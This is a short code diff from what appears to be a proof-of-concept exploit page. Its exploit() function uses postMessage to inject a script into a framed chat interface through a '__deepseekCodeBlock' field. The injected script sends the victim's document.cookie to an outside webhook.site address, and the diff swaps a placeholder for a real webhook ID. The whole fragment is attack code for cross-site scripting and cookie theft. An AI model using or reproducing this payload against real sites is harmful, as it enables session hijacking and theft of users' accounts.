@@ -18,7 +18,7 @@
         function exploit() {
             document.getElementById("targetFrame").contentWindow.postMessage({
                 __deepseekCodeBlock: `<script>
-                    new Image().src = 'https://webhook.site/xxxx?c=' + document.cookie;
+                    new Image().src = 'https://webhook.site/42edc446-fdd6-448c-be3b-b11875dbbada?c=' + document.cookie;
                 </script>`
             }, '*');
         }
